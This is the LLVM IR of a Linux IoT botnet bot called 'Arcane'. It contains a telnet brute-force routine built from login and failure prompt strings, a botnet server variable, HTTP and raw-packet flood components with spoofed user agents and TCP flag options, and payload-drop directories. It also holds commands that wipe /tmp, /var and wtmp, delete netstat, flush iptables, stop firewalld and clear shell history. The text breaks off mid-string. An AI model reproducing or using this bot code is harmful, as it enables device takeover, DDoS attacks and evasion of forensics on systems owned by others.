; ModuleID = 'host/ir_fla/Arcane.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.4, %union.anon.5 }
%union.anon.4 = type { [16 x i8] }
%union.anon.5 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.65, i32 0, i32 0)], align 16
@.str.8 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.9 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.10 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.11 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.12 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.13 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.14 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.15 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.16 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.17 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.18 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.19 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.20 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.21 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.22 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.23 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.24 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.25 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.26 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.27 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.28 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.29 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.30 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.31 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.32 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.33 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.34 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.35 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.36 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.37 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.38 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.39 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.40 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.41 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.42 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.43 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.44 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.45 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.46 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.47 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.48 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.49 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.50 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.51 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.52 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.53 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.54 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.55 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.56 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.57 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.58 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.59 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.60 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.61 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.62 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.63 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.64 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.65 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@BusyBoxPayload = global i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.66, i32 0, i32 0), align 8
@.str.66 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@usernames = global [0 x i8*] zeroinitializer, align 8
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i32 0, i32 0), i8* null], align 16
@.str.67 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.70 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.72 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.73 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.74 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.80, i32 0, i32 0), i8* null], align 16
@.str.77 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.78 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.79 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.80 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0), i8* null], align 16
@.str.81 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.82 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.84 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.85 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* null], align 16
@.str.88 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.89 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.90 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.90, i32 0, i32 0), i8* null], align 16
@botnetServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@switchCommStock = global i32 0, align 4
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@botnetPid = common global i32 0, align 4
@ServerInfo = common global [100 x i32] zeroinitializer, align 16
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.2 = private unnamed_addr constant [14 x i8] c"Python Device\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"/usr/bin/perl\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"Perl Device\00", align 1
@.str.5 = private unnamed_addr constant [18 x i8] c"/usr/sbin/telnetd\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"Telnet Device\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"Unknown\00", align 1
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@rand_alphastr.alphaset = internal constant [32 x i8] c"xq6fh0jrwxiugrogtzqf5p28fnxlm5j\00", align 16
@.str.144 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.91 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@GIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.92 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.93 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.94 = private unnamed_addr constant [34 x i8] c"Arcane Bruteforced = %s [ %s:%s ]\00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.96 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.97 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.98 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.99 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.100 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.101 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.102 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.103 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.104 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.105 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.106 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.107 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.108 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.109 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.110 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.111 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.112 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.113 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.114 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.115 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.116 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.117 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.118 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.119 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.120 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.121 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.122 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.123 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@sendSTD.hexstring = private unnamed_addr constant [1 x i8*] [i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str.124, i32 0, i32 0)], align 8
@.str.124 = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/